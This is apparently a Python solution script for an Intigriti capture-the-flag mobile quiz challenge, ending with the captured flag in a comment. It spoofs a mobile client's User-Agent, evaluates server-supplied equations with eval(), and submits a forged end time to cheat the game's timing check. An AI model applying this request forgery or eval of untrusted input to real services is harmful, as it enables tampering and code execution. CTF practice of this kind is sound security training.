import requests
import json
import time

url = "https://quiz.ctf.intigriti.io/start"
headers = {
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": "okhttp/4.12.0"
}
start_time = int(time.time())
data = {
  "start_time": start_time
}
response = requests.post(url=url, headers=headers, json=data)
gameID = json.loads(response.text).get('game_id')
equation = json.loads(response.text).get('equations')
sum_equation = 0
for i in range(len(equation)):
    sum_equation+=eval(equation[i])
print(sum_equation)


url = "https://quiz.ctf.intigriti.io/submit"
headers = {
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": "okhttp/4.12.0"
}
end_time = start_time + sum_equation
data = {
  "game_id":f"{gameID}",
  "end_time": end_time
}
print(data)
response = requests.post(url=url, headers=headers, json=data)
print(response.text)
# INTIGRITI{4_R34l_m0b1l3_h4ck3RRRRR}
